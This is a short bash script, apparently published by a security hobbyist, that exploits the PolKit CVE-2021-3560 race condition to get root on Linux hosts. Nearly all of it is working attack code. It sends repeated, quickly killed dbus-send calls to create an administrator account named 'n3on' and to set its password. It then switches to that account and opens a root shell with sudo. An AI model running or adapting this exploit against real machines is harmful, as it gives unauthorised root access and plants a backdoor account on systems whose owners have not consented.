#!/bin/bash

# Polkit exploit
#
# A quick one file bash
# To run to get root on boxes vuln to
# PolKit CVE-2021-3560
# BASH script by n3on  
#  @n3onhacks
# github.com/n3onhacks
#   Thanks to Kevin Backhouse for finding the vuln and laying out the info
#

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:n3on string:"Letme In" int32:1 & sleep 0.005s; kill $!

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:n3on string:"Letme In" int32:1 & sleep 0.005s; kill $!

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:n3on string:"Letme In" int32:1 & sleep 0.005s; kill $!

sleep .5

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:n3on string:"Letme In" int32:1 & sleep 0.005s; kill $!

sleep .5

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'' string:'now' & sleep 0.005s; kill $!

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'' string:'now' & sleep 0.005s; kill $!

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'' string:'now' & sleep 0.005s; kill $!

sleep .5

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'' string:'now' & sleep 0.005s; kill $!

su n3on

sleep  1

sudo -s

sleep 1

whoami
